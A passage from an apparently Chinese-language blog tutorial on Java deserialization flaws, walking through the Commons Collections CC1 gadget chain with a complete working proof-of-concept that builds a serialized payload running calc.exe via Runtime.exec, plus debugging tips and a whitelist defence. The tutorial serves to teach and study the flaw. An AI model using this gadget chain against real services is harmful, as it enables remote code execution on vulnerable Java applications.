构造方法略...</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        in.defaultReadObject(); <span class="comment">// 默认反序列化</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="built_in">this</span>.command); <span class="comment">// 危险操作！</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 攻击者构造恶意数据</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Attack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1. 创建恶意对象（命令注入）</span></span><br><span class="line">        <span class="type">VulnerableObject</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">VulnerableObject</span>(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 2. 序列化对象 -&gt; 字节流</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(payload);</span><br><span class="line">        <span class="type">byte</span>[] maliciousData = bos.toByteArray();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 3. 受害者反序列化 -&gt; 触发命令执行</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(maliciousData);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject(); <span class="comment">// 此处弹出计算器！</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析</p><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulnerableObject</span> implements Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> command;</span><br><span class="line">    <span class="comment">// 构造方法：设置要执行的命令</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">VulnerableObject</span><span class="params">(<span class="type">String</span> command)</span> </span>&#123; <span class="keyword">this</span>.command = command; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 反序列化时自动触发</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="type">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> throws IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        in.<span class="built_in">defaultReadObject</span>(); <span class="comment">// 默认反序列化</span></span><br><span class="line">        Runtime.<span class="built_in">getRuntime</span>().<span class="built_in">exec</span>(<span class="keyword">this</span>.command); <span class="comment">// 炸弹引爆点💣</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>攻击流程</strong>：</p><ol><li><p><strong>构造恶意对象</strong>：<code>VulnerableObject payload = new VulnerableObject(&quot;calc.exe&quot;);</code><br> → 相当于制作一个藏了刀的盒子</p></li><li><p><strong>序列化成字节流</strong>：</p> <figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">ByteArrayOutputStream bos <span class="operator">=</span> new ByteArrayOutputStream()<span class="comment">;</span></span><br><span class="line">ObjectOutputStream oos <span class="operator">=</span> new ObjectOutputStream(bos)<span class="comment">;</span></span><br><span class="line">oos.writeObject(payload)<span class="comment">; // 把刀盒封装成快递</span></span><br><span class="line">byte[] maliciousData <span class="operator">=</span> bos.toByteArray()<span class="comment">; // 包裹</span></span><br></pre></td></tr></table></figure></li><li><p><strong>触发漏洞</strong>：</p> <figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">ByteArrayInputStream bis <span class="operator">=</span> new ByteArrayInputStream(maliciousData)<span class="comment">;</span></span><br><span class="line">ObjectInputStream ois <span class="operator">=</span> new ObjectInputStream(bis)<span class="comment">;</span></span><br><span class="line">ois.readObject()<span class="comment">; // 拆快递盒 → 刀（弹出计算器）</span></span><br></pre></td></tr></table></figure></li></ol><p><strong>关键点</strong>：</p><ul><li><strong>漏洞本质</strong>：反序列化是“自动拆箱”过程，<code>readObject()</code>是拆箱工具 → 如果拆箱规则被篡改（重写方法），拆箱时就会执行恶意操作</li><li><strong>关键词定位</strong>：<br>  <code>implements Serializable</code> + <code>private void readObject()</code> → 立刻警惕是否包含危险代码（如<code>Runtime.exec()</code>）</li></ul><p>从中我们能提取哪些关键概念？</p><hr><h3 id="二、从答案反推核心概念"><a href="#二、从答案反推核心概念" class="headerlink" title="二、从答案反推核心概念"></a><strong>二、从答案反推核心概念</strong></h3><h4 id="1-基础点"><a href="#1-基础点" class="headerlink" title="**1. 基础点"></a>**1. 基础点</h4><ul><li><strong>序列化</strong>：对象 → 字节流（<code>ObjectOutputStream.writeObject()</code>）</li><li><strong>反序列化</strong>：字节流 → 对象（<code>ObjectInputStream.readObject()</code>）</li><li><strong>可序列化的条件</strong>：类必须实现 <code>Serializable</code> 接口（标记接口，无方法）</li></ul><blockquote><p> <strong>类比数学公式</strong>：<br><code>序列化 = writeObject()</code>，<code>反序列化 = readObject()</code>，<code>Serializable</code> 是“许可证”。</p></blockquote><h4 id="2-相关知识"><a href="#2-相关知识" class="headerlink" title="2. 相关知识"></a><strong>2. 相关知识</strong></h4><ul><li><strong><code>readObject()</code> 是“自动触发器”</strong>：反序列化时JVM自动调用该方法，<strong>重写它可能引入漏洞</strong>（如上例的 <code>Runtime.exec()</code>）</li><li><strong><code>transient</code> 字段不序列化</strong>：比如密码字段应加 <code>transient</code> 避免泄露</li><li><strong><code>serialVersionUID</code> 是版本号</strong>：显式声明可避免类结构变更导致的兼容问题</li></ul><blockquote><p> <strong>解题关键词</strong>：<br>看到 <code>readObject()</code> → 警惕是否重写 → 检查内部逻辑是否有危险操作（如执行命令、反射调用）。</p></blockquote><hr><h3 id="三、解题思路：为什么漏洞能利用？"><a href="#三、解题思路：为什么漏洞能利用？" class="headerlink" title="三、解题思路：为什么漏洞能利用？"></a><strong>三、解题思路：为什么漏洞能利用？</strong></h3><h4 id="步骤拆解"><a href="#步骤拆解" class="headerlink" title="步骤拆解"></a><strong>步骤拆解</strong></h4><ol><li><strong>目标定位</strong>：找到重写 <code>readObject()</code> 的类（如 <code>VulnerableObject</code>）<br> → <strong>关键词</strong>：类实现 <code>Serializable</code> + 自定义 <code>readObject</code> 方法</li><li><strong>构造恶意输入</strong>：设置危险参数（如 <code>command = &quot;calc.exe&quot;</code>）</li><li><strong>序列化传递</strong>：将对象转为字节流（攻击载荷）</li><li><strong>触发漏洞</strong>：受害者反序列化时自动执行 <code>readObject()</code> 中的恶意代码</li></ol><blockquote><p> <strong>漏洞本质</strong>：<br>反序列化是<strong>“盲盒拆箱”过程</strong>。如果箱子（类）的拆箱规则（<code>readObject</code>）被动了手脚，拆箱时就可能爆炸（执行恶意代码）。</p></blockquote><hr><h3 id="四、漏洞利用链的解题逻辑"><a href="#四、漏洞利用链的解题逻辑" class="headerlink" title="四、漏洞利用链的解题逻辑"></a><strong>四、漏洞利用链的解题逻辑</strong></h3><p>实际漏洞很少像上面那么简单，而是像<strong>多米诺骨牌</strong>一样串联调用（称为Gadget Chain）。例如：</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">readObject</span><span class="params">()</span></span> → 调用A类方法 → 调用B类方法 →...→ 执行Runtime<span class="selector-class">.exec</span>()</span><br></pre></td></tr></table></figure><figure class="highlight xl"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">readObject</span>-&gt;</span>&gt;TransformedMap: 遍历Map触发setValue()</span><br><span class="line">T<span class="function"><span class="title">ransformedMap</span>-&gt;</span>&gt;ChainedTransformer: 调用transform()</span><br><span class="line">C<span class="function"><span class="title">hainedTransformer</span>-&gt;</span>&gt;InvokerTransformer1: 执行ConstantTransformer</span><br><span class="line">I<span class="function"><span class="title">nvokerTransformer1</span>-&gt;</span>&gt;InvokerTransformer2: 反射getMethod()</span><br><span class="line">I<span class="function"><span class="title">nvokerTransformer2</span>-&gt;</span>&gt;InvokerTransformer3: 反射invoke()</span><br><span class="line">I<span class="function"><span class="title">nvokerTransformer3</span>-&gt;</span>&gt;Runtime.exec(): 弹计算器！</span><br></pre></td></tr></table></figure><p><strong>解题方法</strong>：</p><ol><li><strong>起点</strong>：找到一个可触发反序列化的入口（如网络接口接收数据流）</li><li><strong>中间跳板</strong>：利用JDK或第三方库（如Apache Commons Collections）中的危险类：<ul><li>例如 <code>InvokerTransformer.transform()</code> 可通过反射执行任意方法</li></ul></li><li><strong>终点</strong>：连接到最终执行点（如命令执行、文件读写）</li></ol><blockquote><p> <strong>关键词定位链</strong>：</p><ul><li>搜索 <code>readObject()</code> 中调用的其他类方法</li><li>检查这些方法是否调用危险函数（如反射、JNDI、文件操作）</li></ul></blockquote><hr><h3 id="五、防御措施"><a href="#五、防御措施" class="headerlink" title="五、防御措施"></a><strong>五、防御措施</strong></h3><ol><li><strong>避免反序列化不可信数据</strong>：像做数学题验算一样，永远校验数据对没</li><li><strong>替换原生序列化</strong>：用JSON&#x2F;XML等更安全的格式（如Jackson、Gson）</li><li><strong>白名单控制</strong>：限制可反序列化的类（如 <code>ObjectInputStream</code> 的 <code>accept</code> 列表）</li><li><strong>加固关键类</strong>：对敏感类（如 <code>ObjectInputStream</code>）重写 <code>resolveClass()</code> 做校验</li></ol><figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 防御示例：自定义ObjectInputStream添加白名单</span></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">SafeObjectInputStream</span> <span class="keyword">extends</span> <span class="title">ObjectInputStream</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">Class</span>&lt;?&gt; resolveClass(<span class="type">ObjectStreamClass</span> desc) <span class="keyword">throws</span> <span class="type">IOException</span>, <span class="type">ClassNotFoundException</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!desc.getName().equals(<span class="string">&quot;com.safe.MyClass&quot;</span>)) &#123; <span class="comment">// 只允许反序列化指定类</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="type">InvalidClassException</span>(<span class="string">&quot;Unauthorized class: &quot;</span>, desc.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><p>Java反序列化漏洞的本质是：<br><strong>控制输入流 → 触发危险 <code>readObject()</code> → 串联调用链（Gadget）→ 达到攻击效果</strong>  </p><h2 id="javaCC1链"><a href="#javaCC1链" class="headerlink" title="javaCC1链"></a>javaCC1链</h2><h3 id="一、环境准备与漏洞背景"><a href="#一、环境准备与漏洞背景" class="headerlink" title="一、环境准备与漏洞背景"></a><strong>一、环境准备与漏洞背景</strong></h3><h4 id="1-复现环境"><a href="#1-复现环境" class="headerlink" title="1. 复现环境"></a>1. <strong>复现环境</strong></h4><ul><li><p><strong>JDK版本</strong>：≤8u65（高版本修复<code>AnnotationInvocationHandler</code>的反序列化逻辑）<br>下载：<a href="https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html</a> ；<br>（友情提示：如果下载出来是jdk8u111，把&#x2F;cn删去）</p></li><li><p><strong>依赖库</strong>：Commons Collections 3.2.1</p>  <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="2-漏洞核心逻辑"><a href="#2-漏洞核心逻辑" class="headerlink" title="2. 漏洞核心逻辑"></a>2. <strong>漏洞核心逻辑</strong></h4><ul><li><strong>先找到起点</strong>：反序列化入口<code>AnnotationInvocationHandler.readObject()</code></li><li><strong>确定终点</strong>：<code>InvokerTransformer.transform()</code>通过反射执行任意命令（如<code>Runtime.exec(&quot;calc&quot;)</code>）</li><li><strong>目标</strong>：构造一条从<code>readObject()</code>到<code>transform()</code>的调用链，触发RCE。</li></ul><hr><h3 id="二、分步拆解：CC1链的构造"><a href="#二、分步拆解：CC1链的构造" class="headerlink" title="二、分步拆解：CC1链的构造"></a><strong>二、分步拆解：CC1链的构造</strong></h3><h4 id="步骤1：终点-InvokerTransformer"><a href="#步骤1：终点-InvokerTransformer" class="headerlink" title="步骤1：终点 - InvokerTransformer"></a><strong>步骤1：终点 - <code>InvokerTransformer</code></strong></h4><p><strong>作用</strong>：通过反射动态调用任意方法，是命令执行的最终触发点。<br><strong>关键代码</strong>：</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="built_in">public</span> <span class="keyword">Object</span> <span class="keyword">transform</span>(<span class="keyword">Object</span> <span class="keyword">input</span>) &#123;</span><br><span class="line">    <span class="keyword">Method</span> <span class="keyword">method</span> = <span class="keyword">input</span>.getClass().getMethod(iMethodName, iParamTypes);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">method</span>.invoke(<span class="keyword">input</span>, iArgs); // 反射调用任意方法</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>测试验证</strong>：</p><figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">InvokerTransformer <span class="literal">it</span> = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;<span class="built_in">String</span>.<span class="keyword">class</span>&#125;, <span class="keyword">new</span> <span class="built_in">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"><span class="literal">it</span>.transform(Runtime.getRuntime()); <span class="regexp">// 弹出计算器</span></span><br></pre></td></tr></table></figure><p><strong>为什么是它？</strong></p><ul><li>参数<code>iMethodName</code>、<code>iParamTypes</code>、<code>iArgs</code>完全可控，可构造任意反射调用。</li><li>类实现<code>Serializable</code>，支持序列化&#x2F;反序列化。</li></ul><hr><h4 id="步骤2：构建反射调用链-ChainedTransformer"><a href="#步骤2：构建反射调用链-ChainedTransformer" class="headerlink" title="步骤2：构建反射调用链 - ChainedTransformer"></a><strong>步骤2：构建反射调用链 - <code>ChainedTransformer</code></strong></h4><p><strong>问题</strong>：直接调用<code>Runtime.getRuntime()</code>会被安全策略拦截，需通过反射链间接获取<code>Runtime</code>实例。<br><strong>解决方案</strong>：</p><ul><li>**<code>ConstantTransformer</code>**：返回固定对象（如<code>Runtime.class</code>），无视输入。</li><li>**<code>ChainedTransformer</code>**：串联多个<code>Transformer</code>，前者的输出作为后者的输入。</li></ul><p><strong>构造反射链</strong>：</p><figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">Transformer[] chain = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Runtime.<span class="keyword">class</span>), <span class="comment">// 返回Runtime.class对象</span></span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,     <span class="comment">// 反射调用getMethod(&quot;getRuntime&quot;)</span></span><br><span class="line">        <span class="keyword">new</span> Class[]&#123;<span class="built_in">String</span>.<span class="keyword">class</span>, Class[].<span class="keyword">class</span>&#125;, </span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,         <span class="comment">// 调用getRuntime()获取实例</span></span><br><span class="line">        <span class="keyword">new</span> Class[]&#123;<span class="built_in">Object</span>.<span class="keyword">class</span>, <span class="built_in">Object</span>[].<span class="keyword">class</span>&#125;, </span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">Object</span>[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,          <span class="comment">// 执行命令</span></span><br><span class="line">        <span class="keyword">new</span> Class[]&#123;<span class="built_in">String</span>.<span class="keyword">class</span>&#125;, </span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">Transformer chain = <span class="keyword">new</span> ChainedTransformer(chain);</span><br></pre></td></tr></table></figure><p><strong>逻辑等价</strong>：</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p><strong>为什么用链？</strong></p><ul><li>绕过直接调用<code>Runtime</code>的限制，通过反射分步获取对象。</li><li>链式调用符合反序列化时“逐步触发”的特性。</li></ul><hr><h4 id="步骤3：寻找触发点-TransformedMap"><a href="#步骤3：寻找触发点-TransformedMap" class="headerlink" title="步骤3：寻找触发点 - TransformedMap"></a><strong>步骤3：寻找触发点 - <code>TransformedMap</code></strong></h4><p><strong>作用</strong>：装饰普通<code>Map</code>，在修改值时自动调用<code>Transformer</code>。<br><strong>关键方法</strong>：</p><ul><li><code>TransformedMap.decorate()</code>：创建装饰后的<code>Map</code>实例。</li><li><code>checkSetValue()</code>：在<code>MapEntry.setValue()</code>时触发<code>valueTransformer.transform()</code>。</li></ul><p><strong>构造触发点</strong>：</p><figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Map</span>&lt;<span class="built_in">String</span>, <span class="built_in">String</span>&gt; rawMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">rawMap.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>); <span class="comment">// 需注意：key必须为&quot;value&quot;（见步骤4）</span></span><br><span class="line"><span class="built_in">Map</span> transformedMap = TransformedMap.decorate(rawMap, <span class="keyword">null</span>, chain); <span class="comment">// 绑定Transformer链</span></span><br></pre></td></tr></table></figure><p><strong>为什么是它？</strong></p><ul><li><code>TransformedMap</code>是连接<code>Map</code>操作与<code>Transformer</code>调用的桥梁。</li><li><code>setValue()</code>是反序列化过程中可被自动调用的方法。</li></ul><hr><h4 id="步骤4：反序列化入口-AnnotationInvocationHandler"><a href="#步骤4：反序列化入口-AnnotationInvocationHandler" class="headerlink" title="步骤4：反序列化入口 - AnnotationInvocationHandler"></a><strong>步骤4：反序列化入口 - <code>AnnotationInvocationHandler</code></strong></h4><p><strong>作用</strong>：JDK内部类，反序列化时自动遍历<code>Map</code>并调用<code>setValue()</code>。<br><strong>关键逻辑</strong>：</p><ul><li><code>readObject()</code> → 遍历<code>memberValues</code>（<code>Map</code>类型） → 调用<code>MapEntry.setValue()</code>。</li><li><strong>条件限制</strong>：<ol><li><code>memberTypes.get(key)</code>不为空（需选择带方法的注解类，如<code>Target.class</code>）。</li><li><code>key</code>必须为<code>&quot;value&quot;</code>（绕过JDK内部校验）。</li></ol></li></ul><p><strong>反射构造实例</strong>：</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Class</span>&lt;?&gt; clazz = <span class="keyword">Class</span>.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">Constructor&lt;?&gt; ctor = clazz.getDeclaredConstructor(<span class="keyword">Class</span>.<span class="keyword">class</span>, Map.<span class="keyword">class</span>);</span><br><span class="line">ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">Object</span> <span class="keyword">handler</span> = ctor.newInstance(Target.<span class="keyword">class</span>, transformedMap); // 使用Target注解类</span><br></pre></td></tr></table></figure><p><strong>为什么是Target.class？</strong></p><ul><li><code>Target</code>注解定义了<code>value()</code>方法，满足<code>memberTypes.get(&quot;value&quot;) != null</code>的条件。</li></ul><hr><h4 id="步骤5：组装Payload并触发漏洞"><a href="#步骤5：组装Payload并触发漏洞" class="headerlink" title="步骤5：组装Payload并触发漏洞"></a><strong>步骤5：组装Payload并触发漏洞</strong></h4><p><strong>完整POC代码</strong>：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1Exploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1. 构造Transformer链</span></span><br><span class="line">        Transformer[] chain = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(chain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 创建TransformedMap</span></span><br><span class="line">        Map&lt;String, String&gt; rawMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        rawMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;dummy&quot;</span>); <span class="comment">// Key必须为&quot;value&quot;！</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(rawMap, <span class="literal">null</span>, chain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 反射构造AnnotationInvocationHandler</span></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; ctor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">handler</span> <span class="operator">=</span> ctor.newInstance(Target.class, transformedMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 序列化Payload</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;payload.bin&quot;</span>))) &#123;</span><br><span class="line">            oos.writeObject(handler);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. 反序列化触发漏洞（模拟目标环境）</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;payload.bin&quot;</span>))) &#123;</span><br><span class="line">            ois.readObject(); <span class="comment">// 此处弹出计算器！</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者：</p><figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.<span class="keyword">map</span>.TransformedMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line"><span class="keyword">import</span> java.util.<span class="built_in">Map</span>;  </span><br><span class="line">  </span><br><span class="line">public <span class="keyword">class</span> <span class="title class_">SetValueTest01</span> &#123;  </span><br><span class="line">    public <span class="keyword">static</span> <span class="literal">void</span> main(<span class="built_in">String</span>[] args) &#123;  </span><br><span class="line">        Runtime runtime = Runtime.getRuntime();  </span><br><span class="line"> InvokerTransformer invokerTransformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>  </span><br><span class="line"> , <span class="keyword">new</span> Class[]&#123;<span class="built_in">String</span>.<span class="keyword">class</span>&#125;, <span class="keyword">new</span> <span class="built_in">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);  </span><br><span class="line"> HashMap&lt;<span class="built_in">Object</span>, <span class="built_in">Object</span>&gt; hashMap = <span class="keyword">new</span> HashMap&lt;&gt;();  </span><br><span class="line"> hashMap.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);  </span><br><span class="line"> <span class="built_in">Map</span>&lt;<span class="built_in">Object</span>, <span class="built_in">Object</span>&gt; decorateMap = TransformedMap.decorate(hashMap, <span class="literal">null</span>, invokerTransformer);  </span><br><span class="line"> <span class="keyword">for</span> (<span class="built_in">Map</span>.Entry entry:decorateMap.entrySet())&#123;  </span><br><span class="line">            entry.setValue(runtime);  </span><br><span class="line"> &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="三、调试与遇到的问题"><a href="#三、调试与遇到的问题" class="headerlink" title="三、调试与遇到的问题"></a><strong>三、调试与遇到的问题</strong></h3><h4 id="1-断点位置"><a href="#1-断点位置" class="headerlink" title="1. 断点位置"></a>1. <strong>断点位置</strong></h4><ul><li>**<code>InvokerTransformer.transform()</code>**：观察反射参数是否按链传递（应依次出现<code>Runtime.class</code>→<code>Method</code>→<code>Runtime实例</code>→<code>exec</code>）。</li><li>**<code>TransformedMap.checkSetValue()</code>**：验证是否被<code>AnnotationInvocationHandler.readObject()</code>调用。</li><li>**<code>AnnotationInvocationHandler.readObject()</code>**：跟踪<code>memberValues</code>遍历过程，检查<code>key=&quot;value&quot;</code>是否满足条件。</li></ul><h4 id="2-常见问题"><a href="#2-常见问题" class="headerlink" title="2. 常见问题"></a>2. <strong>常见问题</strong></h4><ul><li><strong>计算器未弹出</strong>：<ul><li>检查JDK版本是否为≤8u65（高版本需手动修补<code>AnnotationInvocationHandler</code>字节码）。</li><li>确认<code>Target.class</code>被正确引入（<code>import java.lang.annotation.Target</code>）。</li></ul></li><li><strong>空指针异常</strong>：<ul><li>确保<code>TransformedMap</code>的<code>key=&quot;value&quot;</code>（其他key会导致<code>memberTypes.get(key)=null</code>）。</li></ul></li></ul><hr><h3 id="四、总结：-1"><a href="#四、总结：-1" class="headerlink" 